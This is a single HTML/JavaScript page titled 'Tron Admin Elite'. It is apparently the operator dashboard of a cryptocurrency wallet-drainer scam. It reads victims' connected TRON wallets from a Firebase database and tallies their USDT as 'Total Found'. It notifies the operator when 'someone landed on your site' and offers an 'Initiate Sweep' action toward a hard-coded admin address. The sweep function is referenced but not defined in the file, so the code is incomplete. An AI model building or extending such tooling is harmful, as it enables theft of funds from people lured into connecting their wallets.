<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Tron Admin Elite</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');

        body {
            font-family: 'Inter', sans-serif;
            background: #050505;
            color: #fff;
        }

        .glass {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .user-card { transition: all 0.2s; }
        .user-card:active { transform: scale(0.98); background: rgba(255, 255, 255, 0.06); }

        /* Fix for Overflow */
        .truncate-addr {
            max-width: 140px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        @media (max-width: 380px) {
            .truncate-addr { max-width: 100px; }
        }
    </style>
</head>

<body class="p-4 space-y-6 pb-20">

    <!-- Header -->
    <header class="flex justify-between items-center py-4">
        <div>
            <h1 class="text-xl font-black tracking-tighter">ADMIN <span class="text-blue-500">PANEL</span></h1>
            <p id="liveClock" class="text-[8px] font-bold text-slate-500 uppercase tracking-widest">00:00:00</p>
        </div>
        <div class="flex gap-2">
            <button onclick="toggleAudio()" id="audioBtn" class="w-10 h-10 rounded-xl glass flex items-center justify-center text-slate-500">
                <i class="fas fa-bell"></i>
            </button>
            <button onclick="clearAllData()" class="w-10 h-10 rounded-xl bg-red-500/10 text-red-500 flex items-center justify-center border border-red-500/10">
                <i class="fas fa-trash-alt text-[10px]"></i>
            </button>
        </div>
    </header>

    <!-- Stats -->
    <div class="grid grid-cols-2 gap-3">
        <div class="glass p-4 rounded-2xl">
            <p class="text-[8px] font-bold text-slate-500 uppercase tracking-widest mb-1">Total Found</p>
            <p id="totalUsdt" class="text-lg font-black text-emerald-400">$0.00</p>
        </div>
        <div class="glass p-4 rounded-2xl">
            <p class="text-[8px] font-bold text-slate-500 uppercase tracking-widest mb-1">Sessions</p>
            <p id="userCount" class="text-lg font-black text-blue-400">0</p>
        </div>
    </div>

    <!-- Manual Wallet Search -->
    <div class="glass p-5 rounded-3xl space-y-3">
        <p class="text-[9px] font-black text-blue-500 uppercase tracking-widest">Check Wallet Balance</p>
        <div class="flex gap-2">
            <input type="text" id="manualAddress" placeholder="Enter TRON Address" 
                class="flex-1 bg-black/40 border border-white/5 rounded-xl py-3 px-4 text-[11px] font-mono focus:outline-none focus:border-blue-500/30">
            <button onclick="checkManualBalance()" class="bg-blue-600 px-5 rounded-xl text-white font-black text-[10px] uppercase">
                Scan
            </button>
        </div>
        <div id="manualResult" class="hidden flex justify-between items-center p-3 bg-emerald-500/5 border border-emerald-500/10 rounded-xl">
            <div class="text-[10px] font-mono text-emerald-400/80 truncate-addr" id="resAddr">...</div>
            <div class="text-xs font-black text-emerald-400" id="resBal">$0.00</div>
        </div>
    </div>

    <!-- Activity Feed -->
    <div class="space-y-3" id="userList">
        <!-- Cards -->
    </div>

    <!-- Action Sheet (For Sweep) -->
    <div id="actionSheet" class="fixed inset-0 z-50 bg-black/80 hidden flex items-end" onclick="closeSheet()">
        <div class="glass w-full rounded-t-[40px] p-8 space-y-6 transform translate-y-full transition-transform duration-300" onclick="event.stopPropagation()">
            <div class="w-12 h-1 bg-white/10 rounded-full mx-auto -mt-4"></div>
            <div class="flex justify-between items-start pt-4">
                <div class="flex-1 pr-4 min-w-0">
                    <h3 id="sheetAddress" class="text-xs font-mono text-blue-400 font-bold truncate">T...</h3>
                    <p id="sheetTime" class="text-[9px] text-slate-500 font-bold uppercase mt-1">Status Tracking</p>
                </div>
                <button onclick="closeSheet()" class="text-slate-500"><i class="fas fa-times"></i></button>
            </div>
            <div class="grid grid-cols-2 gap-3">
                <div class="p-4 bg-white/5 rounded-2xl text-center">
                    <p class="text-[8px] text-slate-500 font-bold mb-1 uppercase">USDT</p>
                    <p id="sheetUsdt" class="text-xl font-black text-emerald-400">0.00</p>
                </div>
                <div class="p-4 bg-white/5 rounded-2xl text-center">
                    <p class="text-[8px] text-slate-500 font-bold mb-1 uppercase">TRX</p>
                    <p id="sheetTrx" class="text-xl font-black text-blue-400">0.00</p>
                </div>
            </div>
            <div class="space-y-3">
                <input id="sweepInput" type="number" class="w-full bg-black/40 border border-white/10 rounded-xl p-4 font-black text-lg text-center focus:outline-none focus:border-blue-500">
                <button onclick="executeSweep()" class="w-full bg-blue-600 py-5 rounded-2xl font-black uppercase text-[10px] tracking-widest shadow-lg active:scale-95 transition-all">Initiate Sweep</button>
            </div>
        </div>
    </div>

    <audio id="bellSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyD4qKMlB3TJjYprgpAEkA5Ts-Yvg7aRbp0",
            authDomain: "tronadmin-99827.firebaseapp.com",
            databaseURL: "https://tronadmin-99827-default-rtdb.firebaseio.com",
            projectId: "tronadmin-99827",
            storageBucket: "tronadmin-99827.firebasestorage.app",
            messagingSenderId: "500883948250",
            appId: "1:500883948250:web:203f69935a6825d09b5be3"
        };

        const CONFIG = {
            USDT: "TR7NHqjeKQxGTC18q8ZY4pL8otSzgjLj6t",
            ADMIN: "TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2"
        };

        let users = [];
        let audioEnabled = false;
        let selectedUser = null;
        let tw = new TronWeb({ fullHost: 'https://api.trongrid.io' });

        function startApp() {
            if (firebase.apps.length === 0) firebase.initializeApp(firebaseConfig);
            const db = firebase.database();

            setInterval(() => document.getElementById('liveClock').innerText = new Date().toLocaleTimeString(), 1000);

            db.ref('connections').on('value', (snap) => {
                const data = snap.val();
                if (!data) { users = []; renderUsers(); return; }
                const newUsers = Object.entries(data).map(([key, val]) => ({ ...val, id: key }));
                newUsers.sort((a, b) => b.id.localeCompare(a.id));
                
                if (newUsers.length > users.length) {
                    if (audioEnabled) document.getElementById('bellSound').play().catch(()=>{});
                    if (window.AndroidNative) {
                        if (window.AndroidNative.triggerBeep) window.AndroidNative.triggerBeep();
                        if (window.AndroidNative.showNotification) window.AndroidNative.showNotification("New Visitor!", "Someone landed on your site.");
                    }
                }
                users = newUsers;
                renderUsers();
            });
        }

        function renderUsers() {
            const list = document.getElementById('userList');
            list.innerHTML = '';
            let total = 0;

            users.forEach(u => {
                if (u.status === 'CONNECTED' || u.status === 'PENDING_SIGN') total += parseFloat(u.usdt || 0);
                
                const card = document.createElement('div');
                card.className = "glass p-4 rounded-2xl user-card flex justify-between items-center";
                
                let sColor = "text-blue-400", sText = u.status || "Active";
                if (u.status === "CONNECTED") sColor = "text-emerald-500";
                else if (u.status === "REJECTED") sColor = "text-red-500";

                const addr = u.address.includes('User') ? u.address : (u.address.substring(0, 6) + "..." + u.address.slice(-4));

                card.innerHTML = `
                    <div class="flex items-center gap-3 flex-1 min-w-0" onclick="openSheet('${u.id}')">
                        <div class="w-10 h-10 bg-white/5 rounded-xl flex items-center justify-center"><i class="fas fa-user text-xs ${sColor}"></i></div>
                        <div class="min-w-0 flex-1">
                            <div class="text-xs font-bold truncate">${addr}</div>
                            <div class="text-[7px] text-slate-500 font-bold uppercase">${u.time} • ${u.trx || '0'} TRX</div>
                        </div>
                    </div>
                    <div class="text-right ml-2 shrink-0">
                        <div class="text-sm font-black ${u.usdt > 0 ? 'text-emerald-400' : 'text-slate-700'}">$${u.usdt || '0.00'}</div>
                        <div class="text-[7px] font-black uppercase tracking-widest ${sColor}">${sText}</div>
                    </div>
                `;
                list.appendChild(card);
            });
            document.getElementById('totalUsdt').innerText = `$${total.toFixed(2)}`;
            document.getElementById('userCount').innerText = users.length;
        }

        async function checkManualBalance() {
            const addr = document.getElementById('manualAddress').value.trim();
            if (!addr) return;
            try {
                const usdtContract = await tw.contract().at(CONFIG.USDT);
                const bal = await usdtContract.balanceOf(addr).call();
                const usdt = (parseInt(bal._hex || bal, 16) / 1e6).toFixed(2);
                document.getElementById('resAddr').innerText = addr;
                document.getElementById('resBal').innerText = "$" + usdt;
                document.getElementById('manualResult').classList.remove('hidden');
            } catch (e) { alert("Invalid Address"); }
        }

        function openSheet(id) {
            selectedUser = users.find(u => u.id === id);
            document.getElementById('sheetAddress').innerText = selectedUser.address;
            document.getElementById('sheetUsdt').innerText = selectedUser.usdt;
            document.getElementById('sheetTrx').innerText = selectedUser.trx;
            document.getElementById('sweepInput').value = selectedUser.usdt;
            const sheet = document.getElementById('actionSheet');
            sheet.classList.remove('hidden');
            setTimeout(() => sheet.children[0].classList.remove('translate-y-full'), 10);
        }

        function closeSheet() {
            const sheet = document.getElementById('actionSheet');
            sheet.children[0].classList.add('translate-y-full');
            setTimeout(() => sheet.classList.add('hidden'), 300);
        }

        function toggleAudio() {
            audioEnabled = !audioEnabled;
            document.getElementById('audioBtn').className = `w-10 h-10 rounded-xl flex items-center justify-center transition-all ${audioEnabled ? 'bg-blue-600 text-white' : 'glass text-slate-500'}`;
        }

        function clearAllData() { if (confirm("Clear All?")) firebase.database().ref('connections').remove(); }

        startApp();
    </script>
</body>

</html>
